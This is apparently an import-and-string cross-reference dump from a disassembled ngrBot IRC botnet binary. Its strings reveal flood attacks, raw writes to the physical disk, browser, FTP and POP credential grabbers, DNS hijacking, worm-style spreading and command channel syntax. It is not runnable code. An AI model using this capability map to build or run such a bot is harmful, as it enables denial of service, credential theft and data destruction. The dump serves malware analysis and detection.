reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x173d874a	0x173e10a8	import	0x173d8670	KERNEL32.dll.LocalFree
0x173d88ae	0x173e1278	import	0x173d8790	Secur32.dll.InitializeSecurityContextW
0x173d89e0	0x173e1b18	string	0x173d89b0	Microsoft Unified Security Protocol Provider
0x173d8a32	0x173e1264	import	0x173d89b0	Secur32.dll.AcquireCredentialsHandleW
0x173d8a79	0x173e1278	import	0x173d89b0	Secur32.dll.InitializeSecurityContextW
0x173d8ac3	0x173e126c	import	0x173d89b0	Secur32.dll.QueryContextAttributesW
0x173d8b17	0x173e1270	import	0x173d89b0	Secur32.dll.DeleteSecurityContext
0x173d8b1e	0x173e1274	import	0x173d89b0	Secur32.dll.FreeCredentialsHandle
0x173d8fb5	0x173e1254	import	0x173d8f50	Secur32.dll.ApplyControlToken
0x173d9025	0x173e1270	import	0x173d8f50	Secur32.dll.DeleteSecurityContext
0x173d902f	0x173e1274	import	0x173d8f50	Secur32.dll.FreeCredentialsHandle
0x173d90a5	0x173e19ac	string	0x173d9080	firefox.exe
0x173d90be	0x173e1990	string	0x173d9080	iexplore.exe
0x173d90d8	0x173e1330	string	0x173d9080	pdef
0x173d9101	0x173e113c	import	0x173d9080	KERNEL32.dll.MultiByteToWideChar
0x173d9192	0x173e1b74	string	0x173d9080	%s.Blocked possible browser exploit pack call on URL '%s'
0x173d91f4	0x173e19ac	string	0x173d91f0	firefox.exe
0x173d920d	0x173e1990	string	0x173d91f0	iexplore.exe
0x173d9227	0x173e1330	string	0x173d91f0	pdef
0x173d92a8	0x173e1bc8	string	0x173d91f0	%s.Blocked possible browser exploit pack call on URL '%S'
0x173d9362	0x173e1174	import	0x173d9330	KERNEL32.dll.GetTickCount
0x173d938f	0x173e1188	import	0x173d9330	KERNEL32.dll.Sleep
0x173d9407	0x173e1174	import	0x173d9330	KERNEL32.dll.GetTickCount
0x173d9450	0x173e1174	import	0x173d9430	KERNEL32.dll.GetTickCount
0x173d9549	0x173e1188	import	0x173d9430	KERNEL32.dll.Sleep
0x173d9564	0x173e1174	import	0x173d9430	KERNEL32.dll.GetTickCount
0x173d95e0	0x173e1174	import	0x173d9580	KERNEL32.dll.GetTickCount
0x173d95fc	0x173e1120	import	0x173d9580	KERNEL32.dll.lstrcpyA
0x173d9602	0x173e29e0	string	0x173d9580	Mozilla/4.0
0x173d963c	0x173e29d8	string	0x173d9580	POST
0x173d964a	0x173e29d8	string	0x173d9580	POST
0x173d967f	0x173e2968	string	0x173d9580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0x173d970b	0x173e1180	import	0x173d96b0	KERNEL32.dll.HeapFree
0x173d9728	0x173e10a0	import	0x173d96b0	KERNEL32.dll.lstrcpynA
0x173d9751	0x173e1180	import	0x173d96b0	KERNEL32.dll.HeapFree
0x173d9770	0x173e1174	import	0x173d96b0	KERNEL32.dll.GetTickCount
0x173d97ba	0x173e5ee4	string	0x173d96b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0x173d97f0	0x173e5f18	string	0x173d96b0	[SYN]: Finished flood on "%s:%d"
0x173d981c	0x173e1180	import	0x173d96b0	KERNEL32.dll.HeapFree
0x173d988b	0x173e1180	import	0x173d9830	KERNEL32.dll.HeapFree
0x173d98a8	0x173e10a0	import	0x173d9830	KERNEL32.dll.lstrcpynA
0x173d98d1	0x173e1180	import	0x173d9830	KERNEL32.dll.HeapFree
0x173d98f0	0x173e1174	import	0x173d9830	KERNEL32.dll.GetTickCount
0x173d993a	0x173e5e8c	string	0x173d9830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0x173d9970	0x173e5ec0	string	0x173d9830	[UDP]: Finished flood on "%s:%d"
0x173d999c	0x173e1180	import	0x173d9830	KERNEL32.dll.HeapFree
0x173d9a2d	0x173e1174	import	0x173d99b0	KERNEL32.dll.GetTickCount
0x173d9a60	0x173e1174	import	0x173d99b0	KERNEL32.dll.GetTickCount
0x173d9abe	0x173e1188	import	0x173d99b0	KERNEL32.dll.Sleep
0x173d9ae7	0x173e1120	import	0x173d99b0	KERNEL32.dll.lstrcpyA
0x173d9af0	0x173e2a08	string	0x173d99b0	X-a: b\r\n
0x173d9b00	0x173e29f0	string	0x173d99b0	Connection: Close\r\n\r\n
0x173d9b0f	0x173e1184	import	0x173d99b0	KERNEL32.dll.lstrlenA
0x173d9b51	0x173e1188	import	0x173d99b0	KERNEL32.dll.Sleep
0x173d9b5e	0x173e1184	import	0x173d99b0	KERNEL32.dll.lstrlenA
0x173d9b66	0x173e1174	import	0x173d99b0	KERNEL32.dll.GetTickCount
0x173d9b7f	0x173e1188	import	0x173d99b0	KERNEL32.dll.Sleep
0x173d9bd2	0x173e1174	import	0x173d99b0	KERNEL32.dll.GetTickCount
0x173d9be4	0x173e1184	import	0x173d99b0	KERNEL32.dll.lstrlenA
0x173d9c43	0x173e1174	import	0x173d99b0	KERNEL32.dll.GetTickCount
0x173d9c9a	0x173e1180	import	0x173d9c60	KERNEL32.dll.HeapFree
0x173d9cb3	0x173e1120	import	0x173d9c60	KERNEL32.dll.lstrcpyA
0x173d9cc4	0x173e10a0	import	0x173d9c60	KERNEL32.dll.lstrcpynA
0x173d9cf9	0x173e5e30	string	0x173d9c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x173d9d45	0x173e5e68	string	0x173d9c60	[Slowloris]: Finished flood on "%s"
0x173d9d73	0x173e1180	import	0x173d9c60	KERNEL32.dll.HeapFree
0x173d9da7	0x173e1094	import	0x173d9d90	KERNEL32.dll.VirtualAlloc
0x173d9dd0	0x173e2a14	string	0x173d9d90	\\.\PHYSICALDRIVE0
0x173d9dd5	0x173e1110	import	0x173d9d90	KERNEL32.dll.CreateFileA
0x173d9e02	0x173e1098	import	0x173d9d90	KERNEL32.dll.DeviceIoControl
0x173d9e21	0x173e109c	import	0x173d9d90	KERNEL32.dll.SetFilePointer
0x173d9e2a	0x173e1164	import	0x173d9d90	KERNEL32.dll.WriteFile
0x173d9e56	0x173e109c	import	0x173d9d90	KERNEL32.dll.SetFilePointer
0x173d9ea2	0x173e1098	import	0x173d9d90	KERNEL32.dll.DeviceIoControl
0x173d9eec	0x173e2a28	string	0x173d9ec0	00100
0x173d9f09	0x173e2a14	string	0x173d9ec0	\\.\PHYSICALDRIVE0
0x173d9f16	0x173e1110	import	0x173d9ec0	KERNEL32.dll.CreateFileA
0x173d9f2b	0x173e1098	import	0x173d9ec0	KERNEL32.dll.DeviceIoControl
0x173d9f5a	0x173e1164	import	0x173d9ec0	KERNEL32.dll.WriteFile
0x173d9f77	0x173e1150	import	0x173d9ec0	KERNEL32.dll.CloseHandle
0x173da0a2	0x173e1158	import	0x173da080	KERNEL32.dll.CreateFileW
0x173da0c0	0x173e1164	import	0x173da080	KERNEL32.dll.WriteFile
0x173da0cb	0x173e1150	import	0x173da080	KERNEL32.dll.CloseHandle
0x173da0d8	0x173e1150	import	0x173da080	KERNEL32.dll.CloseHandle
0x173da184	0x173e10c8	import	0x173da150	KERNEL32.dll.GetWindowsDirectoryW
0x173da2ab	0x173e1090	import	0x173da260	KERNEL32.dll.CreateProcessW
0x173da2c5	0x173e1174	import	0x173da2c0	KERNEL32.dll.GetTickCount
0x173da39f	0x173e1184	import	0x173da310	KERNEL32.dll.lstrlenA
0x173da3a8	0x173e57a0	string	0x173da310	30e4b!a1
0x173da3b0	0x173e57a0	string	0x173da310	30e4b!a1
0x173da3bb	0x173e6904	string	0x173da310	\\.\pipe\%08x_ipc
0x173da3fd	0x173e57a0	string	0x173da310	30e4b!a1
0x173da40e	0x173e57a0	string	0x173da310	30e4b!a1
0x173da436	0x173e119c	import	0x173da310	KERNEL32.dll.EnterCriticalSection
0x173da452	0x173e1110	import	0x173da310	KERNEL32.dll.CreateFileA
0x173da464	0x173e1198	import	0x173da310	KERNEL32.dll.LeaveCriticalSection
0x173da484	0x173e1164	import	0x173da310	KERNEL32.dll.WriteFile
0x173da48b	0x173e1150	import	0x173da310	KERNEL32.dll.CloseHandle
0x173da496	0x173e1188	import	0x173da310	KERNEL32.dll.Sleep
0x173da4a1	0x173e1198	import	0x173da310	KERNEL32.dll.LeaveCriticalSection
0x173da557	0x173e2a48	string	0x173da550	NtShutdownSystem
0x173da55c	0x173e16e8	string	0x173da550	ntdll.dll
0x173da57a	0x173e1024	import	0x173da550	ADVAPI32.dll.OpenProcessToken
0x173da588	0x173e2a34	string	0x173da550	SeShutdownPrivilege
0x173da58f	0x173e1028	import	0x173da550	ADVAPI32.dll.LookupPrivilegeValueA
0x173da5b3	0x173e102c	import	0x173da550	ADVAPI32.dll.AdjustTokenPrivileges
0x173da5b9	0x173e116c	import	0x173da550	KERNEL32.dll.GetLastError
0x173da659	0x173e10cc	import	0x173da5d0	KERNEL32.dll.CreateThread
0x173da661	0x173e2ad4	string	0x173da5d0	ngrBot Error
0x173da666	0x173e2a60	string	0x173da5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x173da66f	0x173e12a4	import	0x173da5d0	USER32.dll.MessageBoxA
0x173da678	0x173e10f8	import	0x173da5d0	KERNEL32.dll.WaitForSingleObject
0x173da680	0x173e108c	import	0x173da5d0	KERNEL32.dll.ExitProcess
0x173da6df	0x173e1238	import	0x173da690	SHELL32.dll.SHGetSpecialFolderPathW
0x173da6ed	0x173e1728	string	0x173da690	Internet Explorer\iexplore.exe
0x173da6f9	0x173e1240	import	0x173da690	SHLWAPI.dll.PathAppendW
0x173da70a	0x173e2af0	string	0x173da690	"%s" %S
0x173da77f	0x173e1090	import	0x173da690	KERNEL32.dll.CreateProcessW
0x173da7aa	0x173e1174	import	0x173da790	KERNEL32.dll.GetTickCount
0x173da7dc	0x173e1188	import	0x173da790	KERNEL32.dll.Sleep
0x173da819	0x173e1174	import	0x173da800	KERNEL32.dll.GetTickCount
0x173da859	0x173e1188	import	0x173da800	KERNEL32.dll.Sleep
0x173da8b1	0x173e1534	string	0x173da880	msnu
0x173da8bd	0x173e1330	string	0x173da880	pdef
0x173da8c9	0x173e1b04	string	0x173da880	ffgrab
0x173da8d5	0x173e1b0c	string	0x173da880	iegrab
0x173da8e1	0x173e1a9c	string	0x173da880	ftpgrab
0x173da8ed	0x173e1a68	string	0x173da880	popgrab
0x173da8fc	0x173e13e4	string	0x173da880	bdns
0x173da908	0x173e2b1c	string	0x173da880	usbi
0x173da914	0x173e2b14	string	0x173da880	httpi
0x173da946	0x173e2b04	string	0x173da880	http
0x173da956	0x173e2b04	string	0x173da880	http
0x173da970	0x173e2b30	string	0x173da970	DnsFlushResolverCache
0x173da975	0x173e2b24	string	0x173da970	dnsapi.dll
0x173da9ed	0x173e1090	import	0x173da990	KERNEL32.dll.CreateProcessW
0x173daa39	0x173e29e0	string	0x173daa10	Mozilla/4.0
0x173daa45	0x173e1120	import	0x173daa10	KERNEL32.dll.lstrcpyA
0x173daa60	0x173e12b8	import	0x173daa10	WININET.dll.InternetOpenA
0x173daa78	0x173e1184	import	0x173daa10	KERNEL32.dll.lstrlenA
0x173daa8c	0x173e12b4	import	0x173daa10	WININET.dll.InternetOpenUrlA
0x173daac0	0x173e12b0	import	0x173daa10	WININET.dll.HttpQueryInfoA
0x173daae2	0x173e12ac	import	0x173daa10	WININET.dll.InternetQueryDataAvailable
0x173dab00	0x173e12c8	import	0x173daa10	WININET.dll.InternetReadFile
0x173dabe7	0x173e12c4	import	0x173daa10	WININET.dll.InternetCloseHandle
0x173dac1a	0x173e1178	import	0x173dac00	KERNEL32.dll.HeapAlloc
0x173dac29	0x173e12bc	import	0x173dac00	WININET.dll.HttpQueryInfoW
0x173dac44	0x173e116c	import	0x173dac00	KERNEL32.dll.GetLastError
0x173dac5e	0x173e11a0	import	0x173dac00	KERNEL32.dll.HeapReAlloc
0x173dac80	0x173e2b48	string	0x173dac00	POST
0x173dac85	0x173e1134	import	0x173dac00	KERNEL32.dll.lstrcmpW
0x173dac99	0x173e1180	import	0x173dac00	KERNEL32.dll.HeapFree
0x173dacb2	0x173e1180	import	0x173dac00	KERNEL32.dll.HeapFree
0x173dad0a	0x173e1178	import	0x173dacd0	KERNEL32.dll.HeapAlloc
0x173dad1a	0x173e12c0	import	0x173dacd0	WININET.dll.InternetQueryOptionW
0x173dad31	0x173e116c	import	0x173dacd0	KERNEL32.dll.GetLastError
0x173dad4f	0x173e11a0	import	0x173dacd0	KERNEL32.dll.HeapReAlloc
0x173dad80	0x173e112c	import	0x173dacd0	KERNEL32.dll.WideCharToMultiByte
0x173dadb3	0x173e1120	import	0x173dacd0	KERNEL32.dll.lstrcpyA
0x173dade6	0x173e1180	import	0x173dacd0	KERNEL32.dll.HeapFree
0x173dae05	0x173e1184	import	0x173dae00	KERNEL32.dll.lstrlenA
0x173dae13	0x173e1178	import	0x173dae00	KERNEL32.dll.HeapAlloc
0x173dae69	0x173e1120	import	0x173dae00	KERNEL32.dll.lstrcpyA
0x173dae7f	0x173e1088	import	0x173dae00	KERNEL32.dll.lstrcatA
0x173daeb0	0x173daf0a	string	0x173dae00	hT+>
0x173daed5	0x173e1180	import	0x173dae00	KERNEL32.dll.HeapFree
0x173daeeb	0x173e1180	import	0x173dae00	KERNEL32.dll.HeapFree
0x173daf58	0x173e1120	import	0x173dae00	KERNEL32.dll.lstrcpyA
0x173daf70	0x173e1180	import	0x173dae00	KERNEL32.dll.HeapFree
0x173dafaf	0x173e1184	import	0x173dafa0	KERNEL32.dll.lstrlenA
0x173dafcb	0x173e1178	import	0x173dafa0	KERNEL32.dll.HeapAlloc
0x173db024	0x173e2b88	string	0x173dafa0	POST /%1023s
0x173db055	0x173e2b7c	string	0x173dafa0	Host:
0x173db08e	0x173e10a0	import	0x173dafa0	KERNEL32.dll.lstrcpynA
0x173db0d5	0x173e1178	import	0x173dafa0	KERNEL32.dll.HeapAlloc
0x173db0e3	0x173e2b74	string	0x173dafa0	HTTP
0x173db0ff	0x173e2b68	string	0x173dafa0	http://%s/
0x173db11e	0x173e2b58	string	0x173dafa0	http://%s/%s
0x173db13c	0x173e1180	import	0x173dafa0	KERNEL32.dll.HeapFree
0x173db16a	0x173e1184	import	0x173db160	KERNEL32.dll.lstrlenA
0x173db186	0x173e1178	import	0x173db160	KERNEL32.dll.HeapAlloc
0x173db199	0x173e2b98	string	0x173db160	\r\n\r\n
0x173db1d2	0x173e1178	import	0x173db160	KERNEL32.dll.HeapAlloc
0x173db1e5	0x173e10a0	import	0x173db160	KERNEL32.dll.lstrcpynA
0x173db1f8	0x173e1180	import	0x173db160	KERNEL32.dll.HeapFree
0x173db2ee	0x173db2b0	string	0x173db290	<%u2
0x173db312	0x173e117c	import	0x173db300	KERNEL32.dll.GetProcessHeap
0x173db319	0x173e1178	import	0x173db300	KERNEL32.dll.HeapAlloc
0x173db366	0x173e2bb4	string	0x173db300	lol.exe
0x173db387	0x173e10c8	import	0x173db300	KERNEL32.dll.GetWindowsDirectoryW
0x173db3a1	0x173e10b8	import	0x173db300	KERNEL32.dll.lstrcpynW
0x173db3bb	0x173e1084	import	0x173db300	KERNEL32.dll.GetVolumeInformationW
0x173db3cd	0x173e1184	import	0x173db300	KERNEL32.dll.lstrlenA
0x173db3d3	0x173e57a0	string	0x173db300	30e4b!a1
0x173db3ea	0x173e57a0	string	0x173db300	30e4b!a1
0x173db45b	0x173e2ba0	string	0x173db300	.exe
0x173db461	0x173e10bc	import	0x173db300	KERNEL32.dll.lstrcatW
0x173db4a9	0x173e2c18	string	0x173db480	isadmin
0x173db4ae	0x173e2c10	string	0x173db480	admin
0x173db4fe	0x173e1120	import	0x173db480	KERNEL32.dll.lstrcpyA
0x173db536	0x173e1178	import	0x173db480	KERNEL32.dll.HeapAlloc
0x173db550	0x173e10d8	import	0x173db480	KERNEL32.dll.GetVersionExA
0x173db60d	0x173e1178	import	0x173db480	KERNEL32.dll.HeapAlloc
0x173db620	0x173e68e8	string	0x173db480	http://api.wipmania.com/
0x173db63b	0x173e2be8	string	0x173db480	<br>
0x173db650	0x173e1184	import	0x173db480	KERNEL32.dll.lstrlenA
0x173db65f	0x173e1184	import	0x173db480	KERNEL32.dll.lstrlenA
0x173db67d	0x173e1080	import	0x173db480	KERNEL32.dll.GetLocaleInfoA
0x173db6a8	0x173e1128	import	0x173db480	KERNEL32.dll.lstrcmpA
0x173db6c5	0x173e1080	import	0x173db480	KERNEL32.dll.GetLocaleInfoA
0x173db6f9	0x173e1080	import	0x173db480	KERNEL32.dll.GetLocaleInfoA
0x173db741	0x173e1178	import	0x173db480	KERNEL32.dll.HeapAlloc
0x173db7f1	0x173e2bd0	string	0x173db480	n%s[%s{%s%s{%s
0x173db80b	0x173e2bc4	string	0x173db480	[%s{%s%s{%s
0x173db8be	0x173e2bd0	string	0x173db480	n%s[%s{%s%s{%s
0x173db8d5	0x173e2bc4	string	0x173db480	[%s{%s%s{%s
0x173db94b	0x173e2c20	string	0x173db900	127.0.0.1
0x173db975	0x173e1188	import	0x173db900	KERNEL32.dll.Sleep
0x173db9bc	0x173e119c	import	0x173db990	KERNEL32.dll.EnterCriticalSection
0x173db9d1	0x173e12a0	import	0x173db990	USER32.dll.wvsprintfA
0x173db9f2	0x173e1198	import	0x173db990	KERNEL32.dll.LeaveCriticalSection
0x173dba42	0x173e12a0	import	0x173dba00	USER32.dll.wvsprintfA
0x173dba56	0x173e5d4c	string	0x173dba00	PPPPMSG %s :%s\r\n
0x173dba7f	0x173e5c54	string	0x173dba70	PASS %s\r\n
0x173dba9c	0x173e5d24	string	0x173dba70	KCIK %s\r\n
0x173dbab4	0x173e5d10	string	0x173dba70	SSRR %s 0 0 :%s\r\n
0x173dbb52	0x173e1184	import	0x173dbb30	KERNEL32.dll.lstrlenA
0x173dbba0	0x173e1128	import	0x173dbb80	KERNEL32.dll.lstrcmpA
0x173dbbff	0x173e1128	import	0x173dbbb0	KERNEL32.dll.lstrcmpA
0x173dbc2c	0x173e57a0	string	0x173dbbb0	30e4b!a1
0x173dbc36	0x173e5d88	string	0x173dbbb0	[v="%s" c="%s" h="%s" p="%S"]
0x173dbc89	0x173e2cf4	string	0x173dbbb0	reconnecting
0x173dbc8e	0x173e5d60	string	0x173dbbb0	QUIT :%s\r\n
0x173dbcc3	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dbce1	0x173e1180	import	0x173dbbb0	KERNEL32.dll.HeapFree
0x173dbcec	0x173e2cf4	string	0x173dbbb0	reconnecting
0x173dbcf1	0x173e5d60	string	0x173dbbb0	QUIT :%s\r\n
0x173dbd28	0x173e2ce8	string	0x173dbbb0	exiting
0x173dbd2d	0x173e5d60	string	0x173dbbb0	QUIT :%s\r\n
0x173dbd5a	0x173e2cdc	string	0x173dbbb0	removing
0x173dbd5f	0x173e5d60	string	0x173dbbb0	QUIT :%s\r\n
0x173dbdb2	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dbdc6	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dbdd5	0x173e5d30	string	0x173dbbb0	SEND %s %s\r\n
0x173dbe0c	0x173e2ccc	string	0x173dbbb0	#new
0x173dbe18	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dbe2a	0x173e5d30	string	0x173dbbb0	SEND %s %s\r\n
0x173dbe72	0x173e2cbc	string	0x173dbbb0	#admin
0x173dbe79	0x173e2cb4	string	0x173dbbb0	#user
0x173dbe7f	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dbe91	0x173e5d30	string	0x173dbbb0	SEND %s %s\r\n
0x173dbecb	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dbee7	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dbefa	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dbf0c	0x173e5d30	string	0x173dbbb0	SEND %s %s\r\n
0x173dbf5f	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dbf73	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dbf82	0x173e5d40	string	0x173dbbb0	PART %s\r\n
0x173dbfa6	0x173e2ccc	string	0x173dbbb0	#new
0x173dbfb2	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dbfc4	0x173e5d40	string	0x173dbbb0	PART %s\r\n
0x173dc00c	0x173e2cbc	string	0x173dbbb0	#admin
0x173dc013	0x173e2cb4	string	0x173dbbb0	#user
0x173dc019	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc02b	0x173e5d40	string	0x173dbbb0	PART %s\r\n
0x173dc065	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc081	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc094	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dc0a6	0x173e5d40	string	0x173dbbb0	PART %s\r\n
0x173dc0c3	0x173e5874	string	0x173dbbb0	stop
0x173dc0e3	0x173e5840	string	0x173dbbb0	stats
0x173dc124	0x173e6054	string	0x173dbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x173dc156	0x173e6080	string	0x173dbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x173dc192	0x173e6054	string	0x173dbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x173dc1b9	0x173e6080	string	0x173dbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x173dc1d2	0x173e5850	string	0x173dbbb0	logins
0x173dc225	0x173e1180	import	0x173dbbb0	KERNEL32.dll.HeapFree
0x173dc25e	0x173e2c88	string	0x173dbbb0	[Logins]: Cleared %d logins
0x173dc283	0x173e2c80	string	0x173dbbb0	%s|%s
0x173dc2c2	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dc2d2	0x173e1178	import	0x173dbbb0	KERNEL32.dll.HeapAlloc
0x173dc2ea	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc321	0x173e60d0	string	0x173dbbb0	[RSOCK4]: Stopped rsock4
0x173dc33f	0x173e5848	string	0x173dbbb0	speed
0x173dc354	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc3fd	0x173e57f0	string	0x173dbbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x173dc449	0x173e5d30	string	0x173dbbb0	SEND %s %s\r\n
0x173dc4bf	0x173e5d30	string	0x173dbbb0	SEND %s %s\r\n
0x173dc550	0x173e5d40	string	0x173dbbb0	PART %s\r\n
0x173dc572	0x173e5d40	string	0x173dbbb0	PART %s\r\n
0x173dc5d0	0x173e1330	string	0x173dbbb0	pdef
0x173dc5e2	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dc5f7	0x173e1178	import	0x173dbbb0	KERNEL32.dll.HeapAlloc
0x173dc60e	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc61f	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dc633	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dc642	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dc679	0x173e1330	string	0x173dbbb0	pdef
0x173dc68f	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc6d0	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc6e0	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dc706	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dc73d	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc743	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dc77e	0x173e14f8	string	0x173dbbb0	msnmsg
0x173dc7ce	0x173e5f50	string	0x173dbbb0	[MSN]: Updated MSN spread message to "%s"
0x173dc7e7	0x173e5808	string	0x173dbbb0	msn.int
0x173dc826	0x173e1500	string	0x173dbbb0	msnint
0x173dc859	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dc876	0x173e5f7c	string	0x173dbbb0	[MSN]: Updated MSN spread interval to "%s"
0x173dc88f	0x173e5810	string	0x173dbbb0	http.set
0x173dc8b5	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc8d0	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dc8f5	0x173e1088	import	0x173dbbb0	KERNEL32.dll.lstrcatA
0x173dc92c	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dc955	0x173e2b04	string	0x173dbbb0	http
0x173dc972	0x173e5fa8	string	0x173dbbb0	[HTTP]: Updated HTTP spread message to "%s"
0x173dc97f	0x173e581c	string	0x173dbbb0	http.int
0x173dc9c0	0x173e2b04	string	0x173dbbb0	http
0x173dc9df	0x173e5ff8	string	0x173dbbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x173dc9f8	0x173e5828	string	0x173dbbb0	http.inj
0x173dca16	0x173e2b14	string	0x173dbbb0	httpi
0x173dca26	0x173e2c70	string	0x173dbbb0	enabled
0x173dca2b	0x173e5fd4	string	0x173dbbb0	[HTTP]: Injected value is now %s.
0x173dca43	0x173e2b14	string	0x173dbbb0	httpi
0x173dca53	0x173e2c64	string	0x173dbbb0	disabled
0x173dca58	0x173e5fd4	string	0x173dbbb0	[HTTP]: Injected value is now %s.
0x173dca71	0x173e5838	string	0x173dbbb0	mdns
0x173dca9f	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dcadd	0x173e1178	import	0x173dbbb0	KERNEL32.dll.HeapAlloc
0x173dcaf3	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dcb36	0x173e13e4	string	0x173dbbb0	bdns
0x173dcb41	0x173da970	string	0x173dbbb0	h0+>
0x173dcb56	0x173e2c44	string	0x173dbbb0	[DNS]: Redirecting "%s" to "%s"
0x173dcb76	0x173e13e4	string	0x173dbbb0	bdns
0x173dcb7b	0x173e13dc	string	0x173dbbb0	block
0x173dcb85	0x173da970	string	0x173dbbb0	h0+>
0x173dcb95	0x173e6040	string	0x173dbbb0	[DNS]: Blocked "%s"
0x173dcbf2	0x173dcc0a	string	0x173dbbb0	h|b>
0x173dcbf4	0x173e6028	string	0x173dbbb0	[Visit]: Visited "%s"
0x173dcc0a	0x173e627c	string	0x173dbbb0	[Visit]: Error visitng "%s"
0x173dcc3a	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dcc8b	0x173e2c34	string	0x173dbbb0	%s[%s{%s
0x173dcca8	0x173e2c80	string	0x173dbbb0	%s|%s
0x173dccd4	0x173e1178	import	0x173dbbb0	KERNEL32.dll.HeapAlloc
0x173dcce4	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dcd11	0x173e5860	string	0x173dbbb0	slow
0x173dcd27	0x173e2c80	string	0x173dbbb0	%s|%s
0x173dcd47	0x173e1184	import	0x173dbbb0	KERNEL32.dll.lstrlenA
0x173dcd58	0x173e1178	import	0x173dbbb0	KERNEL32.dll.HeapAlloc
0x173dcd70	0x173e1120	import	0x173dbbb0	KERNEL32.dll.lstrcpyA
0x173dcdfc	0x173e1534	string	0x173dbbb0	msnu
0x173dce55	0x173e1330	string	0x173dbbb0	pdef
0x173dce66	0x173e1b04	string	0x173dbbb0	ffgrab
